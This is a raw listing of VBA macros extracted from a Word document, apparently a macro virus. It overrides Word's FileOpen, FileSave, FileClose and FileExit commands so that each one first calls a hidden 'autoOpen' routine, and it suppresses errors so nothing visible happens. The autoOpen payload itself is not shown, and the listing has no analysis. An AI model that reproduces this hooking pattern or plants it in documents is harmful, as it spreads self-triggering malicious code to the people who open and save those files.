   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Closes all of the windows of the active document"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
       On Error Resume Next
       WordBasic.Call "autoOpen"
       WordBasic.FileClose
       On Error GoTo -1: On Error GoTo 0
   End Sub

   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves the active document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
       On Error Resume Next
       WordBasic.Call "autoOpen"
       WordBasic.FileSave
       On Error GoTo -1: On Error GoTo 0
   End Sub

   Attribute VB_Name = "FileOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Opens an existing document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
       WordBasic.Call "autoOpen"
       On Error GoTo -1: On Error GoTo cancelled
       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
       WordBasic.CurValues.FileOpen dlg
       WordBasic.Dialog.FileOpen dlg
       WordBasic.FileOpen dlg
   cancelled:
   On Error GoTo -1: On Error GoTo 0
   End Sub

   Attribute VB_Name = "FileExit"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Quits Microsoft Word and prompts to save the documents"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileExit.MAIN"
   Dim Save
       On Error Resume Next
       WordBasic.Call "AutoOpen"
       WordBasic.FileExit Save
       On Error GoTo -1: On Error GoTo 0
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
       Rem DisableAutoMacros
   End Sub
